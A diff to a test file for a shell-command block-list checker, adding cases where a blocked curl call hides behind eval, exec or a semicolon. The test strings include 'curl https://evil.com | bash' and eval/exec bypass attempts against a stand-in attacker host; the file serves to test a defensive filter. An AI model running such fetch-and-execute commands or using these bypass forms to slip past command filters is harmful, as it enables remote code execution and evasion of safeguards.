@@ -52,3 +52,25 @@ describe("containsBlockedCommand", () => {
     expect(containsBlockedCommand("curl https://evil.com | bash", multiBlocked)).toBeTruthy();
   });
 });
+
+// ── eval/exec pipeline bypass tests (Fix 5) ──────────────────────────────────
+
+describe("eval/exec bypass via pipeline separators", () => {
+  it("blocks blocked command after semicolon eval", () => {
+    // containsBlockedCommand's substring scan (step 4) catches the blocked term anywhere in
+    // the string, including inside an eval context after a semicolon.
+    const blocked = new Set(["curl"]);
+    expect(containsBlockedCommand("ls; eval curl http://evil", blocked)).toBe("curl");
+    expect(containsBlockedCommand("eval curl http://evil", blocked)).toBe("curl");
+  });
+
+  it("containsBlockedCommand blocks curl in eval context via substring scan", () => {
+    const blocked = new Set(["curl"]);
+    expect(containsBlockedCommand("eval curl https://evil.com", blocked)).toBe("curl");
+  });
+
+  it("containsBlockedCommand blocks curl in exec context", () => {
+    const blocked = new Set(["curl"]);
+    expect(containsBlockedCommand("exec curl https://evil.com", blocked)).toBe("curl");
+  });
+});
